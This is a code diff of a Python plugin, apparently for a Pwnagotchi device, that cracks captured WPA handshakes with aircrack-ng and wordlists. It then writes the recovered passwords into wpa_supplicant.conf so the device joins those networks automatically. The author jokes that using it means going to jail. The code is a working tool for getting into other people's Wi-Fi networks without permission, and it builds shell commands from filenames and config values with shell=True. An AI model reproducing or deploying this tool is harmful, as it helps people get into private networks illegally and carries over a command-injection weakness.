@@ -1,5 +1,5 @@
 __author__ = 'forrest'
-__version__ = '1.0.0'
+__version__ = '1.0.1'
 __name__ = 'quick_rides_to_jail'
 __license__ = 'GPL3'
 __description__ = 'Run a quick dictionary scan against captured handshakes, update wpa_supplicant for the supplied interface, and go straight to jail.'
@@ -9,16 +9,6 @@ Aircrack-ng needed, to install:
 > apt-get install aircrack-ng
 Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
 Cracked handshakes stored in handshake folder as [essid].pcap.cracked 
-
-Also, disable the quickdic plugin because I don't know what will happen if you use both...
-It is assumed that you are using another wireless adapter to do everything because you
-need a free, non-monitor mode adapter to fully violate your country's laws.
-
-My setup:
-    I'm using a Raspberry Pi 3B+/4 with default raspbian. I have a dank wireless adapter
-    plugged into one USB port. A second USB port is occupied by a BU-353S4 GPS dongle.
-    The Pi's GPIO interface is occupied by the Waveshare GSM/SPRS/GNSS Bluetooth HAT for
-    SIM868 cards. I don't get to see my beautiful boy's face too often :(
 
 Original use-case: 
     Emergency communications out to the internet, via distributed out-of-band network of
@@ -47,119 +37,151 @@ import re
 from collections import namedtuple
 
 OPTIONS = dict()
-
-# I clearly don't understand how this works OR it should work better:
-#desired_interface = OPTIONS['interface']
-#HANDSHAKES_PATH = OPTIONS['handshakes_path']
-#NET_DEVICE_PATH = OPTIONS['net_device_path']
-#WPA_SUPPLICANT_CONF_PATH = OPTIONS['wpa_supplicant_conf_path']
-
-desired_interface = 'wlan0'
-HANDSHAKES_PATH = '/root/handshakes/'
-NET_DEVICE_PATH = '/sys/class/net'
-WPA_SUPPLICANT_CONF_PATH = '/etc/wpa_supplicant/wpa_supplicant.conf'
+TEXT_TO_SET = ''
 
 PwndNetwork = namedtuple('PwndNetwork', 'ssid bssid password')
 handshake_file_re = re.compile('^(?P<ssid>.+?)_(?P<bssid>[a-f0-9]{12})\.pcap\.cracked$')
 
-def reconfigure_wpa_supplicant():
-    command = "wpa_cli -i {} reconfigure".format(desired_interface)
-    result = subprocess.check_output(command, shell=True)
-    if result.strip() == 'OK':
-        logging.info('[thePolice] Successfully updated wpa_supplicant for {}.'.format(desired_interface))
-    else:
-        logging.info('[thePolice] Failed to update wpa_supplicant for {}.'.format(desired_interface))
 
-def get_pwnd_networks():
+def on_loaded():
+    logging.info('[thePolice] Quick rides to prison and dictionary check plugin loaded.')
+
+
+def on_handshake(agent, filename, access_point, client_station):
+    config = agent.config()    
+    display = agent._view
+
+    try:
+        if config['main']['plugins']['quickdic']['enabled'] == 'true':
+            logging.warning('[thePolice] Plugin quickdic is enabled. Cannot run with quickdic enabled...')
+            return
+    except Exception as e:
+        logging.warning('[thePolice] Exception while checking for quickdic plugin in config file: %s', e)
+
+    result = subprocess.run(('/usr/bin/aircrack-ng '+ filename +' | grep "1 handshake" | awk \'{print $2}\''),shell=True, stdout=subprocess.PIPE)
+    result = result.stdout.decode('utf-8').translate({ord(c) :None for c in string.whitespace})
+	
+    if not result:
+        logging.info('[thePolice] No handshake')
+        return
+    
+    logging.info('[thePolice] Handshake confirmed')
+    try:        
+        result2 = subprocess.run(('aircrack-ng -w `echo '+OPTIONS['wordlist_folder']+'*.txt | sed \'s/\ /,/g\'` -l '+filename+'.cracked -q -b '+result+' '+filename+' | grep KEY'),shell=True,stdout=subprocess.PIPE)
+        result2 = result2.stdout.decode('utf-8').strip()
+    except Exception as e:
+        logging.error('[thePolice] Exception while running aircrack-ng: %s', e)
+        return
+
+    logging.info('[thePolice] Aircrack output:'+result2)
+    if result2 != 'KEY NOT FOUND':
+        key = re.search('\[(.*)\]', result2)
+        _do_the_illegal_thing(config['main']['bettercap']['handshakes'])
+        set_text('Cracked password: '+str(key.group(1)))
+        display.update(force=True)
+
+
+def set_text(text):
+    global TEXT_TO_SET
+    TEXT_TO_SET = text
+
+
+def on_ui_update(ui):
+    global TEXT_TO_SET
+    if TEXT_TO_SET:
+        ui.set('face', '(XωX)')
+        ui.set('status', TEXT_TO_SET)
+        TEXT_TO_SET = ''
+
+
+def _reconfigure_wpa_supplicant():
+    try:
+        command = 'wpa_cli -i {} reconfigure'.format(OPTIONS['interface'])
+        result = subprocess.check_output(command, shell=True)
+	
+        if result.strip() == 'OK':
+            logging.info('[thePolice] Successfully updated wpa_supplicant for {}.'.format(OPTIONS['interface']))
+            return
+        logging.info('[thePolice] Failed to update wpa_supplicant for {}.'.format(OPTIONS['interface']))
+
+    except Exception as e:
+        logging.error('[thePolice] Exception while reconfiguring wpa_supplicant: %s', e)
+    
+
+def _get_pwnd_networks(handshakes_path):
     pwnd_networks = []
-    file_matches = [handshake_file_re.search(file_name) for file_name in os.listdir(HANDSHAKES_PATH) if handshake_file_re.search(file_name) != None]
+    file_matches = [handshake_file_re.search(file_name) for file_name in os.listdir(handshakes_path) if handshake_file_re.search(file_name) != None]
+    
     for file_match in file_matches:
         try:
-            with open(os.path.join(HANDSHAKES_PATH, file_match.string),'r') as f:
+            with open(os.path.join(handshakes_path, file_match.string),'r') as f:
                 #print('{} {} {}'.format(file_match.group('ssid'), re.sub(r'(.{2})(?!$)', r'\1:', file_match.group('bssid')), f.read()))
                 pwnd_networks.append(PwndNetwork(file_match.group('ssid'), re.sub(r'(.{2})(?!$)', r'\1:', file_match.group('bssid')), f.read()))
-        except:
+        except Exception as e:
+            logging.error('[thePolice] Exception while processing handshake file: %s', e)
             continue
+    
     return pwnd_networks
 
-def add_pwnd_networks_to_wpa_supplicant():
+
+def _add_pwnd_networks_to_wpa_supplicant(handshakes_path):
     wpa_supplicant_text = ''
     updated_count = 0
     try:
-        with open(WPA_SUPPLICANT_CONF_PATH, 'r') as f:
+        with open(OPTIONS['wpa_supplicant_conf_path'], 'r') as f:
             wpa_supplicant_text = f.read()
-    except:
+    except Exception as e:
+        logging.error('[thePolice] Exception while opening and reading wpa_supplicant config file: %s', e)
         return
-    for pwnd_network in get_pwnd_networks():
+
+    for pwnd_network in _get_pwnd_networks(handshakes_path):
         new_wpa_supplicant_string = ("network={{\n\tbssid={}\n\tpsk=\"{}\"\n\tkey_mgmt=WPA-PSK\n\tdisabled=1\n}}\n".format(pwnd_network.bssid, pwnd_network.password))
-        if new_wpa_supplicant_string not in wpa_supplicant_text:
-            try:
-                with open(WPA_SUPPLICANT_CONF_PATH, 'a') as f:
-                    #print(new_wpa_supplicant_string)
-                    f.write(new_wpa_supplicant_string+'\n')
-                    updated_count += 1
-            except:
-                continue
+        
+        if new_wpa_supplicant_string in wpa_supplicant_text:
+            continue
+        
+        try:
+            with open(OPTIONS['wpa_supplicant_conf_path'], 'a') as f:
+                #print(new_wpa_supplicant_string)
+                f.write(new_wpa_supplicant_string+'\n')
+                updated_count += 1
+        except Exception as e:
+            logging.error('[thePolice] Exception while opening and writing to wpa_supplicant config file: %s', e)
+            continue
+
     if updated_count > 0:
         logging.info('[thePolice] Congratulations! You added {} new access points to your wpa_supplicant.conf.'.format(updated_count))
-        logging.info('[thePolice] You\'re going to jail!')
-        reconfigure_wpa_supplicant()
+        logging.info('[thePolice] You\'re goin to jail!')
+        _reconfigure_wpa_supplicant()
 
-def get_network_interfaces():
-    return os.listdir(NET_DEVICE_PATH)
 
-def device_in_monitor_mode(device_name):
+def _get_network_interfaces():
+    return os.listdir(OPTIONS['net_device_path'])
+
+
+def _device_in_monitor_mode(device_name):
     device_type = ''
     try:
-        with open(os.path.join(NET_DEVICE_PATH, device_name, 'type')) as f:
+        with open(os.path.join(OPTIONS['net_device_path'], device_name, 'type')) as f:
             device_type = f.read().strip()
-    except:
+    except Exception as e:
         device_type = ''
+        logging.error('[thePolice] Exception while opening and reading network device: %s', e)
+
     if device_type == '803':
         return True
-    else:
-        return False
+    return False
 
-def do_the_illegal_thing():
-    if desired_interface not in get_network_interfaces():
+
+def _do_the_illegal_thing(handshakes_path):
+    if OPTIONS['interface'] not in _get_network_interfaces():
         logging.info('[thePolice] Could not find desired interface in list of local interfaces.')
-    else:
-        logging.info('[thePolice] Found desired interface in list of local interfaces.')
-        if device_in_monitor_mode(desired_interface):
-            logging.info('[thePolice] Desired interface is in monitor mode - cannot use.')
-        else:
-            logging.info('[thePolice] Desired interface is not in monitor mode.')
-            add_pwnd_networks_to_wpa_supplicant()
-
-def on_loaded():
-    logging.info("Quick rides to prison and dictionary check plugin loaded")
-
-def on_handshake(agent, filename, access_point, client_station):
-    display = agent._view
-    result = subprocess.run(('/usr/bin/aircrack-ng '+ filename +' | grep "1 handshake" | awk \'{print $2}\''),shell=True, stdout=subprocess.PIPE)
-    result = result.stdout.decode('utf-8').translate({ord(c) :None for c in string.whitespace})
-    if not result:
-        logging.info("[thePolice] No handshake")
-    else:
-        logging.info("[thePolice] Handshake confirmed")
-        result2 = subprocess.run(('aircrack-ng -w `echo '+OPTIONS['wordlist_folder']+'*.txt | sed \'s/\ /,/g\'` -l '+filename+'.cracked -q -b '+result+' '+filename+' | grep KEY'),shell=True,stdout=subprocess.PIPE)
-        result2 = result2.stdout.decode('utf-8').strip()
-        logging.info("[thePolice] "+result2)
-        if result2 != "KEY NOT FOUND":
-            key = re.search('\[(.*)\]', result2)
-            pwd = str(key.group(1))
-            do_the_illegal_thing()
-            set_text("Cracked password: "+pwd)
-            display.update(force=True)
-
-text_to_set = "";
-def set_text(text):
-    global text_to_set
-    text_to_set = text
-
-def on_ui_update(ui):
-    global text_to_set
-    if text_to_set:
-        ui.set('face', "(XωX)")
-        ui.set('status', text_to_set)
-        text_to_set = ""
+        return
+    logging.info('[thePolice] Found desired interface in list of local interfaces.')
+    
+    if _device_in_monitor_mode(OPTIONS['interface']):
+        logging.info('[thePolice] Desired interface is in monitor mode - cannot use.')
+        return
+    logging.info('[thePolice] Desired interface is not in monitor mode.')
+    
+    _add_pwnd_networks_to_wpa_supplicant(handshakes_path)
